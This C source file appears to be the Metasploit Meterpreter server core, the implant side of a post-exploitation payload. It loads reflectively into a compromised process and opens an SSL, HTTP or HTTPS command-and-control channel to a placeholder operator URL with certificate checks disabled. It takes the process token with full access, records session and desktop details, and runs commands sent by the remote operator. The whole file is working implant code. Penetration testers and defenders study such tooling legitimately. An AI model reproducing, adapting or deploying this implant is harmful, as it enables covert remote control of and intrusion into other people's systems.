#include "metsrv.h"
#include "../../common/common.h"


char * global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
int global_expiration_timeout = 0xb64be661;
int global_comm_timeout       = 0xaf79257f;

#ifdef _WIN32

#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION 
#include <excpt.h> 

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/ReflectiveLoader.c"

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep) 
{
	return EXCEPTION_EXECUTE_HANDLER;
}

#define InitAppInstance() do {					\
		if( hAppInstance == NULL )		\
		    hAppInstance = GetModuleHandle( NULL );	\
	} while (0)

#else
#define InitAppInstance()
#define exceptionfilter(a, b)
#define SetHandleInformation(a, b, c)
#define ExitThread(x) exit((x))
const unsigned int hAppInstance = 0x504b5320; // 'PKS '
#endif

#define PREPEND_ERROR "### Error: "
#define PREPEND_INFO  "### Info : "
#define PREPEND_WARN  "### Warn : "

/*
 * This thread is the main server thread which we use to syncronize a gracefull 
 * shutdown of the server during process migration.
 */
THREAD * serverThread = NULL;

/*
 * An array of locks for use by OpenSSL.
 */
static LOCK ** ssl_locks = NULL;

/*
 * A callback function used by OpenSSL to leverage native system locks.
 */
static VOID server_locking_callback( int mode, int type, const char * file, int line )
{
	if( mode & CRYPTO_LOCK )
		lock_acquire( ssl_locks[type] );
	else
		lock_release( ssl_locks[type] );
}

/*
 * A callback function used by OpenSSL to get the current threads id.
 * While not needed on windows this must be used for posix meterpreter.
 */
static DWORD server_threadid_callback( VOID )
{
#ifdef _WIN32
	return GetCurrentThreadId();
#else
	return pthread_self();
#endif
}

/*
 * Callback function for dynamic lock creation for OpenSSL.
 */
static struct CRYPTO_dynlock_value * server_dynamiclock_create( const char * file, int line )
{
	return (struct CRYPTO_dynlock_value *)lock_create();
}

/*
 * Callback function for dynamic lock locking for OpenSSL.
 */
static void server_dynamiclock_lock( int mode, struct CRYPTO_dynlock_value * l, const char * file, int line )
{
	LOCK * lock = (LOCK *)l;

	if( mode & CRYPTO_LOCK )
		lock_acquire( lock );
	else
		lock_release( lock );
}

/*
 * Callback function for dynamic lock destruction for OpenSSL.
 */
static void server_dynamiclock_destroy( struct CRYPTO_dynlock_value * l, const char * file, int line )
{
	lock_destroy( (LOCK *)l );
}

/*
 * Flush all pending data on the connected socket before doing SSL.
 */
static VOID server_socket_flush( Remote * remote )
{
	fd_set fdread;
	DWORD ret;
	SOCKET fd;
    unsigned char buff[4096];

	lock_acquire( remote->lock );

	fd = remote_get_fd(remote);

	while (1) {
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec  = 1;
		tv.tv_usec = 0;

		data = select(fd + 1, &fdread, NULL, NULL, &tv);
		if(data == 0)
			break;

		ret = recv(fd, buff, sizeof(buff), 0);
		dprintf("[SERVER] Flushed %d bytes from the buffer");

		// The socket closed while we waited
		if(ret == 0) {
			break;
		}
		continue;
	}

	lock_release( remote->lock );
}

/*
 * Poll a socket for data to recv and block when none available.
 */
static LONG server_socket_poll( Remote * remote, long timeout )
{
	struct timeval tv;
	LONG result;
	fd_set fdread;
	SOCKET fd;

	lock_acquire( remote->lock );

	fd = remote_get_fd( remote );

	FD_ZERO( &fdread );
	FD_SET( fd, &fdread );

	tv.tv_sec  = 0;
	tv.tv_usec = timeout;

	result = select( fd + 1, &fdread, NULL, NULL, &tv );

#ifndef _WIN32 
	// Handle EAGAIN, etc.
	if(result == -1) {
		if(errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK) {
			result = 0;
		}
	}
#endif

	lock_release( remote->lock );

	return result;
}

/*
 * Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 */
static BOOL server_initialize_ssl( Remote * remote )
{
	int i = 0;

	lock_acquire( remote->lock );

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = (LOCK**)malloc( CRYPTO_num_locks() * sizeof(LOCK *) );
	if( ssl_locks == NULL )
	{
		lock_release( remote->lock );
		return FALSE;
	}

	for( i=0 ; i<CRYPTO_num_locks() ; i++ )
		ssl_locks[i] = lock_create();

	CRYPTO_set_id_callback( server_threadid_callback );
	CRYPTO_set_locking_callback( server_locking_callback );
	CRYPTO_set_dynlock_create_callback( server_dynamiclock_create );
	CRYPTO_set_dynlock_lock_callback( server_dynamiclock_lock );
	CRYPTO_set_dynlock_destroy_callback( server_dynamiclock_destroy  ); 

	lock_release( remote->lock );

	return TRUE;
}

/*
 * Bring down the OpenSSL subsystem
 */
static BOOL server_destroy_ssl( Remote * remote )
{
	int i = 0;

	if( remote == NULL )
		return FALSE;

	dprintf("[SERVER] Destroying SSL");

	lock_acquire( remote->lock );

	SSL_free( remote->ssl );
	
	SSL_CTX_free( remote->ctx );

	CRYPTO_set_locking_callback( NULL );
	CRYPTO_set_id_callback( NULL );
	CRYPTO_set_dynlock_create_callback( NULL );
	CRYPTO_set_dynlock_lock_callback( NULL );
	CRYPTO_set_dynlock_destroy_callback( NULL );

	for( i=0 ; i<CRYPTO_num_locks() ; i++ )
		lock_destroy( ssl_locks[i] );
		
	free( ssl_locks );

	lock_release( remote->lock );

	return TRUE;
}
/*
 * Negotiate SSL on the socket.
 */
static BOOL server_negotiate_ssl(Remote *remote)
{
	BOOL success = TRUE;
	SOCKET fd    = 0;
	DWORD ret    = 0;
	DWORD res    = 0;

	lock_acquire( remote->lock );

	do
	{
		fd = remote_get_fd(remote);

		remote->meth = SSLv3_client_method();

		remote->ctx  = SSL_CTX_new(remote->meth);
		SSL_CTX_set_mode(remote->ctx, SSL_MODE_AUTO_RETRY);

		remote->ssl  = SSL_new(remote->ctx);
		SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
		    
		if( SSL_set_fd(remote->ssl, remote->fd) == 0 )
		{
			dprintf("[SERVER] set fd failed");
			success = FALSE;
			break;
		}
		
		do {
			if( (ret = SSL_connect(remote->ssl)) != 1 )
			{
				res = SSL_get_error(remote->ssl, ret);
				dprintf("[SERVER] connect failed %d\n", res);

				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE) {
					// Catch non-blocking socket errors and retry
					continue;
				}

				success = FALSE;
				break;
			}
		} while(ret != 1);
		
		if (success == FALSE) break;

		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");

		if( (ret = SSL_write(remote->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0 )
		{
			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(remote->ssl, ret));
		}

	} while(0);

	lock_release( remote->lock );

	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
	
	if( ret < 0 )
		success = FALSE;

	return success;
}

/*
 * The servers main dispatch loop for incoming requests using SSL over TCP
 */
static DWORD server_dispatch( Remote * remote )
{
	LONG result     = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt    = NULL;

	dprintf( "[DISPATCH] entering server_dispatch( 0x%08X )", remote );

	// Bring up the scheduler subsystem.
	result = scheduler_initialize( remote );
	if( result != ERROR_SUCCESS )
		return result;

	while( TRUE )
	{
		if( event_poll( serverThread->sigterm, 0 ) )
		{
			dprintf( "[DISPATCH] server dispatch thread signaled to terminate..." );
			break;
		}

		result = server_socket_poll( remote, 100 );
		if( result > 0 )
		{
			result = packet_receive( remote, &packet );
			if( result != ERROR_SUCCESS ) {
				dprintf( "[DISPATCH] packet_receive returned %d, exiting dispatcher...", result );		
				break;
			}

			cpt = thread_create( command_process_thread, remote, packet );
			if( cpt )
			{
				dprintf( "[DISPATCH] created command_process_thread 0x%08X, handle=0x%08X", cpt, cpt->handle );
				thread_run( cpt );
			}
		}
		else if( result < 0 )
		{
			dprintf( "[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result );
			break;
		}
	}

	dprintf( "[DISPATCH] calling scheduler_destroy..." );
	scheduler_destroy();

	dprintf( "[DISPATCH] calling command_join_threads..." );
	command_join_threads();

	dprintf( "[DISPATCH] leaving server_dispatch." );

	return result;
}


/*
 * The servers main dispatch loop for incoming requests using SSL over TCP
 */
static DWORD server_dispatch_http_wininet( Remote * remote )
{
	LONG result     = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt    = NULL;
	URL_COMPONENTS bits;
	DWORD ecount = 0;
	DWORD delay = 0;

	
	if (global_expiration_timeout > 0) 
		remote->expiration_time  = current_unix_timestamp() + global_expiration_timeout;
	else
		remote->expiration_time = 0;
	
	remote->comm_timeout     = global_comm_timeout;
	remote->start_time       = current_unix_timestamp();
	remote->comm_last_packet = current_unix_timestamp();
	
	// Allocate the top-level handle
	remote->hInternet = InternetOpen("Meterpreter/Windows", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!remote->hInternet) {
		dprintf("[DISPATCH] Failed InternetOpen: %d", GetLastError());
		return 0;
	}
	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);

	// The InternetCrackUrl method was poorly designed...
	memset(&bits, 0, sizeof(bits));
	bits.dwStructSize = sizeof(bits);
	bits.dwSchemeLength    = 1;
	bits.dwHostNameLength  = 1;
	bits.dwUserNameLength  = 1;
	bits.dwPasswordLength  = 1;
	bits.dwUrlPathLength   = 1;
	bits.dwExtraInfoLength = 1;
	InternetCrackUrl(remote->url, 0, 0, &bits);

	remote->uri = _strdup(bits.lpszUrlPath);

	bits.lpszHostName[bits.dwHostNameLength] = 0;


	dprintf("[DISPATCH] Configured URL: %s", remote->uri);
	dprintf("[DISPATCH] Host: %s Port: %u", bits.lpszHostName, bits.nPort);

	// Allocate the connection handle
	remote->hConnection = InternetConnect(remote->hInternet, bits.lpszHostName, bits.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!remote->hConnection) {
		dprintf("[DISPATCH] Failed InternetConnect: %d", GetLastError());
		return 0;
	}
	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);


	// Bring up the scheduler subsystem.
	result = scheduler_initialize( remote );
	if( result != ERROR_SUCCESS )
		return result;

	while( TRUE )
	{
		if (remote->comm_timeout != 0 && remote->comm_last_packet + remote->comm_timeout < current_unix_timestamp()) {
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->expiration_time != 0 && remote->expiration_time < current_unix_timestamp()) {
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->expiration_time);
			break;
		}

		if( event_poll( serverThread->sigterm, 0 ) )
		{
			dprintf( "[DISPATCH] server dispatch thread signaled to terminate..." );
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive( remote, &packet );
		if( result != ERROR_SUCCESS ) {

			if (ecount < 10)
				delay = 10 * ecount;
			else 
				delay = 100 * ecount;
			
			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep( min(10000, delay) );
			continue;
		}

		remote->comm_last_packet = current_unix_timestamp();

		// Reset the empty count when we receive a packet
		ecount = 0;

		dprintf("[DISPATCH] Returned result: %d", result);

		cpt = thread_create( command_process_thread, remote, packet );
		if( cpt )
		{
			dprintf( "[DISPATCH] created command_process_thread 0x%08X, handle=0x%08X", cpt, cpt->handle );
			thread_run( cpt );
		}	
	}

	// Close WinInet handles
	InternetCloseHandle(remote->hConnection);
	InternetCloseHandle(remote->hInternet);

	dprintf( "[DISPATCH] calling scheduler_destroy..." );
	scheduler_destroy();

	dprintf( "[DISPATCH] calling command_join_threads..." );
	command_join_threads();

	dprintf( "[DISPATCH] leaving server_dispatch." );

	return result;
}

/*
 * Get the session id that this meterpreter server is running in.
 */
DWORD server_sessionid( VOID )
{
#ifdef _WIN32
	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );

	static PROCESSIDTOSESSIONID pProcessIdToSessionId = NULL;
	HMODULE hKernel   = NULL;
	DWORD dwSessionId = 0;

	do
	{
		if( !pProcessIdToSessionId )
		{
			hKernel = LoadLibrary( "kernel32.dll" );
			if( hKernel )
				pProcessIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress( hKernel, "ProcessIdToSessionId" );
		}

		if( !pProcessIdToSessionId )
			break;

		if( !pProcessIdToSessionId( GetCurrentProcessId(), &dwSessionId ) )
			dwSessionId = -1;

	} while( 0 );

	if( hKernel )
		FreeLibrary( hKernel );

	return dwSessionId;
#else
	return -1;
#endif
}
/*
 * Setup and run the server. This is called from Init via the loader.
 */
DWORD server_setup( SOCKET fd )
{
	Remote * remote        = NULL;
	char cStationName[256] = {0};
	char cDesktopName[256] = {0};
	DWORD res              = 0;

	dprintf("[SERVER] Initializing...");

#ifdef _UNIX
	int local_error = 0;
#endif

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	srand( (unsigned int)time(NULL) );
	
	__try 
	{
		do
		{
			dprintf( "[SERVER] module loaded at 0x%08X", hAppInstance );
			
			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();

			dprintf( "[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm );

			if( !(remote = remote_allocate(fd)) )
			{
				SetLastError( ERROR_NOT_ENOUGH_MEMORY );
				break;
			}

			remote->url = global_meterpreter_url;

			if (strcmp(global_meterpreter_transport+12, "TRANSPORT_SSL") == 0) {
				remote->transport = METERPRETER_TRANSPORT_SSL;
				dprintf("[SERVER] Using SSL transport...");
			} else if (strcmp(global_meterpreter_transport+12, "TRANSPORT_HTTPS") == 0) {
				remote->transport = METERPRETER_TRANSPORT_HTTPS;
				dprintf("[SERVER] Using HTTPS transport...");
			} else if (strcmp(global_meterpreter_transport+12, "TRANSPORT_HTTP") == 0) {
				remote->transport = METERPRETER_TRANSPORT_HTTP;
				dprintf("[SERVER] Using HTTP transport...");
			}

			// Do not allow the file descriptor to be inherited by child processes
			SetHandleInformation((HANDLE)fd, HANDLE_FLAG_INHERIT, 0);

			dprintf("[SERVER] Initializing tokens...");

			// Store our thread handle
			remote->hServerThread = serverThread->handle;

#ifdef _WIN32
			// Store our process token
			if (!OpenThreadToken(remote->hServerThread, TOKEN_ALL_ACCESS, TRUE, &remote->hServerToken))
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->hServerToken);

			// Copy it to the thread token
			remote->hThreadToken = remote->hServerToken;

			// Save the initial session/station/desktop names...
			remote->dwOrigSessionId      = server_sessionid();
			remote->dwCurrentSessionId   = remote->dwOrigSessionId;
			GetUserObjectInformation( GetProcessWindowStation(), UOI_NAME, &cStationName, 256, NULL );
			remote->cpOrigStationName    = _strdup( cStationName );
			remote->cpCurrentStationName = _strdup( cStationName );
			GetUserObjectInformation( GetThreadDesktop( GetCurrentThreadId() ), UOI_NAME, &cDesktopName, 256, NULL );
			remote->cpOrigDesktopName    = _strdup( cDesktopName );
			remote->cpCurrentDesktopName = _strdup( cDesktopName );
#endif




			// Process our default SSL-over-TCP transport
			if (remote->transport == METERPRETER_TRANSPORT_SSL) {
				dprintf("[SERVER] Flushing the socket handle...");
				server_socket_flush( remote );
		
				dprintf("[SERVER] Initializing SSL...");
				if( !server_initialize_ssl( remote ) )
					break;

				dprintf("[SERVER] Negotiating SSL...");
				if( !server_negotiate_ssl( remote ) )
					break;

				dprintf("[SERVER] Registering dispatch routines...");
				register_dispatch_routines();

				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", remote->transport);
				server_dispatch( remote );
		
				dprintf("[SERVER] Deregistering dispatch routines...");
				deregister_dispatch_routines( remote );
			}

			if (remote->transport == METERPRETER_TRANSPORT_HTTP || remote->transport == METERPRETER_TRANSPORT_HTTPS) {
				dprintf("[SERVER] Registering dispatch routines...");
				register_dispatch_routines();
				
				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", remote->transport);
#ifdef _WIN32
				server_dispatch_http_wininet( remote );
#else
				// XXX: Handle non-windows HTTP transport
#endif 

				dprintf("[SERVER] Deregistering dispatch routines...");
				deregister_dispatch_routines( remote );
			}

		} while (0);

		if (remote->transport == METERPRETER_TRANSPORT_SSL) {
			dprintf("[SERVER] Closing down SSL...");
			server_destroy_ssl( remote );
		}

		if( remote )
			remote_deallocate( remote );

	} 
	__except( exceptionfilter(GetExceptionCode(), GetExceptionInformation()) )
	{
		dprintf("[SERVER] *** exception triggered!");

		thread_kill( serverThread );
	}

	dprintf("[SERVER] Finished.");
	return res;
}
